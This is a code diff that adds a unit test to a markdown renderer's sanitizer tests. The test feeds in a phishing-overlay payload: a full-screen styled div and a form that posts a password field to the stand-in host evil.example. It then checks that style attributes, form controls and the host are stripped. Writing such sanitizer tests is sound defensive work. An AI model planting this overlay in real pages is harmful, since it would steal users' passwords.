@@ -17,4 +17,9 @@ describe('renderMarkdown', () => {
     expect(html).not.toContain('onerror')
     expect(html).not.toContain('javascript:')
   })
+
+  it('strips style attributes and form controls (no phishing overlays)', () => {
+    const html = renderMarkdown('<div style="position:fixed;inset:0">x</div><form action="https://evil.example"><input name=password><button>go</button></form>')
+    for (const bad of ['style', '<form', '<input', '<button', 'evil.example']) expect(html).not.toContain(bad)
+  })
 })
